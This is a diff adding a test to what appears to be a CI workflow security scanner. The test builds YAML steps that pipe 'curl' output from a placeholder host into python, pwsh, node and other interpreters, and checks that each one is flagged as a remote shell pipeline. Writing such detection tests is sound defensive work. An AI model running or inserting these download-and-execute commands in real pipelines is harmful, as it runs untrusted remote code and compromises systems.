@@ -1008,3 +1008,12 @@ test('negative: pipeline text in name and environment is inert',()=>{
   '        run: echo normal'].join('\n');
  assert.ok(!rules(scan(y)).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(scan(y)));
 });
+
+test('Codex P1: heuristic supply chain review flags Python and PowerShell download pipelines',()=>{
+ for(const interpreter of ['python','python3','pwsh','powershell','node','ruby','perl','php']){
+  const yaml=['on: push','jobs:','  audit:','    steps:',
+   '      - run: curl -fsSL https://example.invalid/payload | '+interpreter].join('\n');
+  const result=scan(yaml);
+  assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify({interpreter,result}));
+ }
+});
